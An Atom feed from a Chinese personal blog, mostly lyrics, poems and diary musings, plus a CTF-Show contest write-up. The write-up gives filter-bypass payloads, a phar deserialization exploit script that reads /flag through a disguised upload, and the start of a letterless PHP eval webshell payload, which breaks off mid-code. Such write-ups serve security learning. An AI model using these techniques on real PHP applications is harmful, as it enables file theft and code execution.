<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>忆 执 昔 来 的 旅 途</title>
  
  
  <link href="https://xizhi-future.github.io/atom.xml" rel="self"/>
  
  <link href="https://xizhi-future.github.io/"/>
  <updated>2021-10-01T11:43:15.379Z</updated>
  <id>https://xizhi-future.github.io/</id>
  
  <author>
    <name>xizhi-future</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>世间美好与你环环相扣</title>
    <link href="https://xizhi-future.github.io/2021/10/01/%E4%B8%96%E9%97%B4%E7%BE%8E%E5%A5%BD%E4%B8%8E%E4%BD%A0%E7%8E%AF%E7%8E%AF%E7%9B%B8%E6%89%A3/"/>
    <id>https://xizhi-future.github.io/2021/10/01/%E4%B8%96%E9%97%B4%E7%BE%8E%E5%A5%BD%E4%B8%8E%E4%BD%A0%E7%8E%AF%E7%8E%AF%E7%9B%B8%E6%89%A3/</id>
    <published>2021-10-01T11:42:25.000Z</published>
    <updated>2021-10-01T11:43:15.379Z</updated>
    
    <content type="html"><![CDATA[<h3 id="世间美好与你环环相扣"><a href="#世间美好与你环环相扣" class="headerlink" title="世间美好与你环环相扣"></a>世间美好与你环环相扣</h3><p>偏偏秉烛夜游</p><p>午夜星辰 似奔走之友</p><p>爱你每个结痂伤口</p><p>酿成的陈年烈酒</p><p>入喉尚算可口</p><p>怎么泪水 还偶尔失守</p><p>邀你细看心中缺口</p><p>裂缝中留存 温柔</p><p>此时已莺飞草长 爱的人正在路上</p><p>我知他风雨兼程 途经日暮不赏</p><p>穿越人海 只为与你相拥</p><p>此刻已皓月当空 爱的人手捧星光</p><p>我知他乘风破浪 去了黑暗一趟</p><p>感同身受 给你救赎热 望</p><p>知道你不能 还要你感受</p><p>让星光加了一点彩虹</p><p>让樱花偷偷 吻你额头</p><p>让世间美好 与你环环相扣</p><p>此时已莺飞草长 爱的人正在路上</p><p>我知他风雨兼程 途经日暮不赏</p><p>穿越人海 只为与你相拥</p><p>此刻已皓月当空 爱的人手捧星光</p><p>我知他乘风破浪 去了黑暗一趟</p><p>感同身受 给你救赎热 望</p><p>此时已莺飞草长 爱的人正在路上</p><p>我知他风雨兼程 途经日暮不赏</p><p>穿越人海 只为与你相拥</p><p>此刻已皓月当空 爱的人手捧星光</p><p>我知他乘风破浪 去了黑暗一趟</p><p>感同身受 给你救赎热 望</p><p>知道你不能 还要你感受</p><p>让星光加了一点彩虹</p><p>当樱花开的纷纷扬扬</p><p>当世间美好 与你环环相扣</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;世间美好与你环环相扣&quot;&gt;&lt;a href=&quot;#世间美好与你环环相扣&quot; class=&quot;headerlink&quot; title=&quot;世间美好与你环环相扣&quot;&gt;&lt;/a&gt;世间美好与你环环相扣&lt;/h3&gt;&lt;p&gt;偏偏秉烛夜游&lt;/p&gt;
&lt;p&gt;午夜星辰 似奔走之友&lt;/p&gt;
&lt;p&gt;爱你每个结痂</summary>
      
    
    
    
    <category term="音乐分享" scheme="https://xizhi-future.github.io/categories/%E9%9F%B3%E4%B9%90%E5%88%86%E4%BA%AB/"/>
    
    
  </entry>
  
  <entry>
    <title>唯愿我们</title>
    <link href="https://xizhi-future.github.io/2021/10/01/%E5%94%AF%E6%84%BF%E6%88%91%E4%BB%AC/"/>
    <id>https://xizhi-future.github.io/2021/10/01/%E5%94%AF%E6%84%BF%E6%88%91%E4%BB%AC/</id>
    <published>2021-10-01T11:40:26.000Z</published>
    <updated>2021-10-01T11:41:42.683Z</updated>
    
    <content type="html"><![CDATA[<h3 id="唯愿我们"><a href="#唯愿我们" class="headerlink" title="唯愿我们"></a>唯愿我们</h3><p>从鲜衣怒马到鬓染白发 </p><p>不过弹指一刹那； </p><p>从小桥人家到沧海无涯</p><p>匆匆一眼尽繁华。 </p><p>流年似水， 往事不可追； </p><p>光阴似箭， 物是人已非。 </p><p>让烦恼缠绕心尖， 生活一片颓然； </p><p>让痛苦徘徊耳边， 人生全是不满。</p><p>感情的遗憾， 不如放手随他。 </p><p>想送你回家的人， </p><p>东西南北都顺路； </p><p>想陪你吃饭的人， </p><p>酸甜苦辣都可口；</p><p>想见你一面的人，</p><p>隔山隔海都能来。</p><p>生活的刁难， 不如看淡放宽。</p><p>生命这一程， 交织着风霜雨雪；</p><p>人生这一段， 夹杂着泥泞坎坷。 </p><p>没有跨不过的河， </p><p>没有迈不过的坎。</p><p>内心的执迷， 不如随风飘散。</p><p>有一往无前， 就有知难而退。 </p><p>看透了， 便是过眼云烟； </p><p>想通了， 不过昙花一现。 </p><p>不念过去， 不畏将来， </p><p>你若不放心上， 岁月便会无恙。</p><p>边走边看， 是一种优雅；</p><p>边走边忘， 是一份豁达。 </p><p>敬往事一杯酒， 愿岁月不回头。 </p><p><strong>唯愿我们：</strong></p><p>  <strong>过去的， 别再遗憾；</strong><br>  <strong>未来的， 无须忧虑；</strong><br>  <strong>现在的， 加倍珍惜。</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;唯愿我们&quot;&gt;&lt;a href=&quot;#唯愿我们&quot; class=&quot;headerlink&quot; title=&quot;唯愿我们&quot;&gt;&lt;/a&gt;唯愿我们&lt;/h3&gt;&lt;p&gt;从鲜衣怒马到鬓染白发 &lt;/p&gt;
&lt;p&gt;不过弹指一刹那； &lt;/p&gt;
&lt;p&gt;从小桥人家到沧海无涯&lt;/p&gt;
&lt;p&gt;匆匆一眼尽繁华。</summary>
      
    
    
    
    <category term="生活杂谈" scheme="https://xizhi-future.github.io/categories/%E7%94%9F%E6%B4%BB%E6%9D%82%E8%B0%88/"/>
    
    
  </entry>
  
  <entry>
    <title>难熬的一夜</title>
    <link href="https://xizhi-future.github.io/2021/10/01/%E9%9A%BE%E7%86%AC%E7%9A%84%E4%B8%80%E5%A4%9C/"/>
    <id>https://xizhi-future.github.io/2021/10/01/%E9%9A%BE%E7%86%AC%E7%9A%84%E4%B8%80%E5%A4%9C/</id>
    <published>2021-10-01T11:38:19.000Z</published>
    <updated>2021-10-01T11:39:46.754Z</updated>
    
    <content type="html"><![CDATA[<p>难以想象，现在是8月27日5：56，我现在正躺在床上，写着这篇感想。</p><p>这个时间，对于我来说，怎么可能，不在睡觉，可事实是，什么鬼，我简直不敢相信，我入戏就</p><p>这么深吗，从前根本没有这样过，整整一个晚上，我满脑子都是剧情，可怕的剧情。夜里，好多</p><p>次清醒着，却又不敢睁眼，生怕一睁眼，就会有那张脸出现在我的眼前。要么就是满脑子的男主</p><p>女主，我对男主的经历感到很难过，并不是他的错啊，他也很痛苦啊，可是为什么要让他来承受</p><p>这一切。哎，总之，我很伤心，更为之心痛。</p><p>天色渐渐明朗，我听见了下面阿姨的扫地声，突然就不觉着害怕了，因为，这个世界很美好的不</p><p>是吗？你自己不也说过，这个世界，远比你想象的更加美好！太阳总会升起，世界总会迎来光</p><p>明。</p><p>就当是在给自己壮胆吧，世界的黑暗也总得有人知道，它在帮助我们变得更加勇敢。</p><p>2021.8.27    6：12</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;难以想象，现在是8月27日5：56，我现在正躺在床上，写着这篇感想。&lt;/p&gt;
&lt;p&gt;这个时间，对于我来说，怎么可能，不在睡觉，可事实是，什么鬼，我简直不敢相信，我入戏就&lt;/p&gt;
&lt;p&gt;这么深吗，从前根本没有这样过，整整一个晚上，我满脑子都是剧情，可怕的剧情。夜里，好多&lt;/p</summary>
      
    
    
    
    <category term="生活杂谈" scheme="https://xizhi-future.github.io/categories/%E7%94%9F%E6%B4%BB%E6%9D%82%E8%B0%88/"/>
    
    
  </entry>
  
  <entry>
    <title>查无此人</title>
    <link href="https://xizhi-future.github.io/2021/10/01/%E6%9F%A5%E6%97%A0%E6%AD%A4%E4%BA%BA/"/>
    <id>https://xizhi-future.github.io/2021/10/01/%E6%9F%A5%E6%97%A0%E6%AD%A4%E4%BA%BA/</id>
    <published>2021-10-01T11:36:26.000Z</published>
    <updated>2021-10-01T11:51:12.530Z</updated>
    
    <content type="html"><![CDATA[<p>村上春树说</p><p>“你要记得那些黑暗中默默抱紧你的人，逗你笑的人，陪你彻夜聊天的人，坐车来看望你的人，带</p><p>着你四处游荡的人，说想念你的人。是这些人组成你生命中一点一滴的温暖，是这些温暖使你成</p><p>为善良的人。”</p><p>然后，在评论中我看到了，<br>，<br>，<br>查无此人。。。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;村上春树说&lt;/p&gt;
&lt;p&gt;“你要记得那些黑暗中默默抱紧你的人，逗你笑的人，陪你彻夜聊天的人，坐车来看望你的人，带&lt;/p&gt;
&lt;p&gt;着你四处游荡的人，说想念你的人。是这些人组成你生命中一点一滴的温暖，是这些温暖使你成&lt;/p&gt;
&lt;p&gt;为善良的人。”&lt;/p&gt;
&lt;p&gt;然后，在评论中我</summary>
      
    
    
    
    <category term="生活杂谈" scheme="https://xizhi-future.github.io/categories/%E7%94%9F%E6%B4%BB%E6%9D%82%E8%B0%88/"/>
    
    
  </entry>
  
  <entry>
    <title>胡适与江冬秀</title>
    <link href="https://xizhi-future.github.io/2021/10/01/%E8%83%A1%E9%80%82%E4%B8%8E%E6%B1%9F%E5%86%AC%E7%A7%80/"/>
    <id>https://xizhi-future.github.io/2021/10/01/%E8%83%A1%E9%80%82%E4%B8%8E%E6%B1%9F%E5%86%AC%E7%A7%80/</id>
    <published>2021-10-01T11:34:34.000Z</published>
    <updated>2021-10-01T11:35:33.614Z</updated>
    
    <content type="html"><![CDATA[<p>她并非小肚鸡肠，她能容忍胡适的风花雪月，但她就是不愿意原谅，曾经那么信任的两个人，嘴</p><p>上说着表哥表妹，背地里却狠狠背叛了她。</p><p>张爱玲说：”他们（胡适和江冬秀）是旧式婚姻罕有的幸福例子。”</p><p>她看多了旧式婚姻之中女人的悲剧，她绝对不能做怨妇，不能被丈夫牵着鼻子走，而是让胡适在</p><p>生活中依赖她，在心中敬重她，在感情上不能轻易放弃她。</p><p>胡适和江冬秀弯弯绕绕，终于走向白头功德圆满，他从刚开始的衡量算计，委屈求全，到真正为</p><p>江冬秀折服。世人笑他一位西装客娶了小脚女，哪知在江冬秀的人生哲理前，胡适的那些小聪明</p><p>真的就不算什么事儿了。</p><p>思君不见，倍感思君；别离难忍，忍痛别离。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;她并非小肚鸡肠，她能容忍胡适的风花雪月，但她就是不愿意原谅，曾经那么信任的两个人，嘴&lt;/p&gt;
&lt;p&gt;上说着表哥表妹，背地里却狠狠背叛了她。&lt;/p&gt;
&lt;p&gt;张爱玲说：”他们（胡适和江冬秀）是旧式婚姻罕有的幸福例子。”&lt;/p&gt;
&lt;p&gt;她看多了旧式婚姻之中女人的悲剧，她绝对不能做</summary>
      
    
    
    
    <category term="生活杂谈" scheme="https://xizhi-future.github.io/categories/%E7%94%9F%E6%B4%BB%E6%9D%82%E8%B0%88/"/>
    
    
  </entry>
  
  <entry>
    <title>CTF-Show-吃瓜杯</title>
    <link href="https://xizhi-future.github.io/2021/10/01/CTF-Show-%E5%90%83%E7%93%9C%E6%9D%AF/"/>
    <id>https://xizhi-future.github.io/2021/10/01/CTF-Show-%E5%90%83%E7%93%9C%E6%9D%AF/</id>
    <published>2021-10-01T11:19:34.000Z</published>
    <updated>2021-10-01T11:20:18.220Z</updated>
    
    <content type="html"><![CDATA[<p>CTF Show 吃瓜杯篇。</p><span id="more"></span><h1 id="CTF-Show-吃瓜杯"><a href="#CTF-Show-吃瓜杯" class="headerlink" title="CTF Show 吃瓜杯"></a>CTF Show 吃瓜杯</h1><h2 id="热身"><a href="#热身" class="headerlink" title="热身"></a>热身</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==4476)&#123;</span><br><span class="line">        die(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[a-z]|\./i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        die(<span class="string">&quot;no no no!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!strpos(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        die(<span class="string">&quot;no no no!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>,0)===4476)&#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?num=%20010574</span><br><span class="line">?num=%0c010574</span><br><span class="line">?num=%0a010574</span><br></pre></td></tr></table></figure><h2 id="ATTup"><a href="#ATTup" class="headerlink" title="ATTup"></a>ATTup</h2><p>zip 文件上传 + 文件包含 file_get_contents —&gt; <a href="https://www.cnblogs.com/zzjdbk/p/13030571.html">phar 反序列化</a></p><p>文件内容过滤  &lt;?   php ，过滤 <code>&lt;?</code> ，无法正常解析为 php 代码</p><p>上传成功发现：序列化与反序列化</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">class View &#123;</span><br><span class="line">    public <span class="variable">$fn</span>;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__invoke</span></span>()&#123;</span><br><span class="line">        <span class="variable">$text</span> = base64_encode(file_get_contents(<span class="variable">$this</span>-&gt;fn));</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;&quot;</span>.<span class="variable">$text</span>.<span class="string">&quot;&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Fun&#123;</span><br><span class="line">    public <span class="variable">$fun</span> = <span class="string">&quot;:)&quot;</span>;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__toString</span></span>()&#123;</span><br><span class="line">        <span class="variable">$fuc</span> = <span class="variable">$this</span>-&gt;fun;</span><br><span class="line">        <span class="variable">$fuc</span>();</span><br><span class="line">        <span class="built_in">return</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;Be a happy string~&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;Just a fun &quot;</span>.<span class="variable">$this</span>-&gt;fun.<span class="string">&quot;&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_POST</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="variable">$stat</span> = @<span class="built_in">stat</span>(<span class="variable">$filename</span>);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__toString() <span class="comment">//把类当作字符串使用时触发 echo 对象; $text=$test+$对象； </span></span><br><span class="line">__invoke() <span class="comment">//当尝试以调用函数的方式调用一个对象时，该方法会被自动调用</span></span><br></pre></td></tr></table></figure><p><strong>生成 .phar 文件：</strong></p><p>我们的目的是成功创建 View 对象然后成功调用 __invoke() 方法，利用 file_get_contents 来读取到文件中的内容。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class View&#123;</span><br><span class="line">    public <span class="variable">$fn</span>;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__invoke</span></span>()&#123;</span><br><span class="line">        <span class="variable">$text</span> = base64_encode(file_get_contents(<span class="variable">$this</span>-&gt;fn));</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;&quot;</span>.<span class="variable">$text</span>.<span class="string">&quot;&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Fun&#123;</span><br><span class="line">    public <span class="variable">$fun</span>=<span class="string">&#x27;:)&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__toString</span></span>()&#123;</span><br><span class="line">        <span class="variable">$fuc</span> = <span class="variable">$this</span>-&gt;fun;</span><br><span class="line">        <span class="variable">$fuc</span>();</span><br><span class="line">        <span class="built_in">return</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;Be a happy string~&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;Just a fun &quot;</span>.<span class="variable">$this</span>-&gt;fun.<span class="string">&quot;&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$phar</span> = new Phar(<span class="string">&#x27;123.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; stopBuffering();</span><br><span class="line"><span class="variable">$phar</span> -&gt; setStub(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&amp;lt;?= __HALT_COMPILER(); ?&amp;gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span> = new Fun();</span><br><span class="line"><span class="variable">$b</span>-&gt;fun= new Fun();</span><br><span class="line"><span class="variable">$b</span>-&gt;fun-&gt;fun=new View(); <span class="comment"># 当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用</span></span><br><span class="line"><span class="variable">$b</span>-&gt;fun-&gt;fun-&gt;fn=<span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line"><span class="variable">$phar</span> -&gt; addFromString(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; setMetadata(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; stopBuffering();</span><br></pre></td></tr></table></figure><ul><li><code>&lt;?</code> 过滤，使用 实体html 编码代替 ，<code>&amp;lt;    &amp;gt;</code>   </li></ul><p>访问，生成 123.phar</p><p>更改后缀得到 123.zip</p><p>上传</p><p>查询 123.zip</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=phar://123.zip</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/16/Zvp58TYJkoBsUfO.png" alt="image-20210816154246098"></p><p><img src="https://i.loli.net/2021/10/01/p8VCePGW9IHAQd6.png" alt="image-20210816113908803"></p><h2 id="魔女"><a href="#魔女" class="headerlink" title="魔女"></a>魔女</h2><p><img src="https://i.loli.net/2021/08/14/IekhA6SdQWPnt7N.png" alt="image-20210814201633444"></p><p>注册</p><p><img src="https://i.loli.net/2021/08/14/KmC57VgziIMBRa4.png" alt="image-20210814201610476"></p><p>注册成功，登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">layui.use([<span class="string">&#x27;layer&#x27;</span>, <span class="string">&#x27;form&#x27;</span>,<span class="string">&#x27;table&#x27;</span>,<span class="string">&#x27;element&#x27;</span>], <span class="function"><span class="title">function</span></span>()&#123;</span><br><span class="line">  var layer = layui.layer</span><br><span class="line">  ,form = layui.form</span><br><span class="line">  ,table = layui.table</span><br><span class="line">  ,element = layui.element</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">home</span></span>()&#123;</span><br><span class="line">    $.cookie(<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;main&#x27;</span>);</span><br><span class="line">    $.cookie(<span class="string">&#x27;ctfshow&#x27;</span>,<span class="string">&#x27;0x36d|&#x27;</span>+<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    location.replace(location.href);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">logout</span></span>()&#123;</span><br><span class="line">$.cookie(<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;logout&#x27;</span>);</span><br><span class="line">$.cookie(<span class="string">&#x27;ctfshow&#x27;</span>,<span class="string">&#x27;0x36d|&#x27;</span>+<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">location.replace(location.href);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">saveAvatar</span></span>()&#123;</span><br><span class="line">$.cookie(<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;download&#x27;</span>);</span><br><span class="line">    $.cookie(<span class="string">&#x27;ctfshow&#x27;</span>,<span class="string">&#x27;0x36d|&#x27;</span>+<span class="string">&#x27;avatar.jpg|true&#x27;</span>);</span><br><span class="line">    window.open(location.href);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">avatar</span></span>()&#123;</span><br><span class="line">layer.prompt(&#123;</span><br><span class="line">  formType: 0,</span><br><span class="line">  value: <span class="string">&#x27;http://xxx.com/x.jpg(其他格式无效)&#x27;</span>,</span><br><span class="line">  title: <span class="string">&#x27;修改头像&#x27;</span>,</span><br><span class="line">&#125;, <span class="keyword">function</span>(value, index, elem)&#123;</span><br><span class="line">      layer.close(index);</span><br><span class="line">  $.cookie(<span class="string">&#x27;ctfshow&#x27;</span>,<span class="string">&#x27;0x36d|&#x27;</span>+<span class="string">&#x27;xixi|&#x27;</span>+value);</span><br><span class="line">  $.cookie(<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;changeavatar&#x27;</span>);</span><br><span class="line">      location.replace(location.href);</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">profile</span></span>()&#123;</span><br><span class="line"></span><br><span class="line">$.cookie(<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;page&#x27;</span>);</span><br><span class="line">    $.cookie(<span class="string">&#x27;ctfshow&#x27;</span>,<span class="string">&#x27;0x36d|&#x27;</span>+<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    location.replace(location.href);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">changePSW</span></span>()&#123;</span><br><span class="line">layer.prompt(&#123;</span><br><span class="line">  formType: 0,</span><br><span class="line">  value: <span class="string">&#x27;请输入当前密码&#x27;</span>,</span><br><span class="line">  title: <span class="string">&#x27;修改密码&#x27;</span>,</span><br><span class="line">&#125;, <span class="keyword">function</span>(value, index, elem)&#123;</span><br><span class="line">  $.cookie(<span class="string">&#x27;ctfshow&#x27;</span>,<span class="string">&#x27;0x36d|&#x27;</span>+value);</span><br><span class="line">  layer.close(index);</span><br><span class="line">  layer.prompt(&#123;</span><br><span class="line">  formType: 0,</span><br><span class="line">  value: <span class="string">&#x27;请输入新密码&#x27;</span>,</span><br><span class="line">  title: <span class="string">&#x27;修改密码&#x27;</span>,</span><br><span class="line">&#125;, <span class="keyword">function</span>(value, index, elem)&#123;</span><br><span class="line">  layer.close(index);</span><br><span class="line">  $.cookie(<span class="string">&#x27;ctfshow&#x27;</span>,$.cookie(<span class="string">&#x27;ctfshow&#x27;</span>)+<span class="string">&#x27;|&#x27;</span>+value);</span><br><span class="line">  $.cookie(<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;changepwd&#x27;</span>);</span><br><span class="line">  location.replace(location.href);</span><br><span class="line">&#125;);</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="shellme-Revenge"><a href="#shellme-Revenge" class="headerlink" title="shellme_Revenge"></a>shellme_Revenge</h2><p><img src="https://i.loli.net/2021/08/14/R9IkSsTqpHV1dtf.png" alt="image-20210814203429707"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?looklook=1</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);<span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;looklook&#x27;</span>])&#123;    highlight_file(__FILE__);&#125;<span class="keyword">else</span>&#123;    setcookie(<span class="string">&quot;hint&quot;</span>, <span class="string">&quot;?looklook&quot;</span>, time()+3600);&#125;<span class="keyword">if</span> (isset(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];    <span class="keyword">if</span> (is_string(<span class="variable">$ctfshow</span>) || strlen(<span class="variable">$ctfshow</span>) &lt;= 107) &#123;        <span class="keyword">if</span> (!preg_match(<span class="string">&quot;/[!@#%^&amp;*:&#x27;\&quot;|`a-zA-BD-Z~\\\\]|[4-9]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;            <span class="built_in">eval</span>(<span class="variable">$ctfshow</span>);        &#125;<span class="keyword">else</span>&#123;            <span class="built_in">echo</span>(<span class="string">&quot;fucccc hacker!!&quot;</span>);        &#125;    &#125;&#125; <span class="keyword">else</span> &#123;    phpinfo();&#125;?&gt;</span><br></pre></td></tr></table></figure><p><strong>assert()</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php<span class="variable">$_</span>=[];<span class="variable">$_</span>=@<span class="string">&quot;<span class="variable">$_</span>&quot;</span>; // <span class="variable">$_</span>=<span class="string">&#x27;Array&#x27;</span>;<span class="variable">$_</span>=<span 